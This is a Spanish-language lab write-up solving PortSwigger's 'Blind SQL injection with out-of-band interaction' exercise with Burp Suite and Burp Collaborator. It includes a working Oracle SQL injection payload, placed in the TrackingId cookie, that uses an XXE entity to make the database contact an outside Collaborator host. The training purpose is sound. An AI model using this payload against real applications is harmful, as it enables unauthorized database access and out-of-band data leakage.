---
title: PortSwigger - Blind SQL injection with out-of-band interaction
layout: post
post-image: /assets/images/gatohacker4.jpg 
description: La resolución del reto Blind SQL injection with out-of-band interaction. 
tags:
- portswigger
- sqli
- post
- writeups
---
# Solución
---

> Nota:
>
> Este reto solo se puede resolver con Burpsuite Professional

Vamos a la página principal.

![](/images/images-portswigger-sqli/lab15-3.png)

Primero configura la extensión [FoxyProxy](https://getfoxyproxy.org/) para que funcione con Burpsuite, después ve a Burpsuite y haz click en el botón **Intercept is off** para que quede en azul.

![](/images/images-portswigger-sqli/lab15-1.png)

![](/images/images-portswigger-sqli/lab15-2.png)

Volvemos al navegador y recargamos la página.

![](/images/images-portswigger-sqli/lab15-4.png)

Vemos la petición, hacemos click derecho y marcamos la opción **Send to Repeater**.

![](/images/images-portswigger-sqli/lab15-5.png)

Luego vamos a la pestaña **Repeteater**.

![](/images/images-portswigger-sqli/lab15-6.png)

Acá podemos modificar la petición con más comodidad.

![](/images/images-portswigger-sqli/lab15-7.png)

Necesitaremos el Burp Collaborator para realizar este ataque, así que vamos al botón de la esquina que dice Burp y seleccionamos **Burp Collaborator client**. Si no te sale esta opción es porque no tienes el Burpsuite Professional.

![](/images/images-portswigger-sqli/lab15-8.png)

Deberías tener una pestaña parecida a esta.

![](/images/images-portswigger-sqli/lab15-9.png)

Haces click en el botón **Copy to clipboard**.

![](/images/images-portswigger-sqli/lab15-10.png)

Volvemos a la pestaña **Repeater** y en el valor de la cookie TrackingId agregamos esta query:

```bash
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//acá_pegas_el_valor_que_copiaste_anteriormente/">+%25remote%3b]>'),'/l')+FROM+dual--
```

![](/images/images-portswigger-sqli/lab15-17.png)

Haces click en el botón **Send**.

![](/images/images-portswigger-sqli/lab15-19.png)

Obtenemos una respuesta con el código 200 OK.

![](/images/images-portswigger-sqli/lab15-21.png)

Volvemos a la pestaña de Burp Collaborator y hacemos click en **Poll now**.

![](/images/images-portswigger-sqli/lab15-14.png)

Y veremos el resultado.

![](/images/images-portswigger-sqli/lab15-18.png)

Volvemos a la página principal del laboratorio y resolvemos el reto.

![](/images/images-portswigger-sqli/lab15-20.png)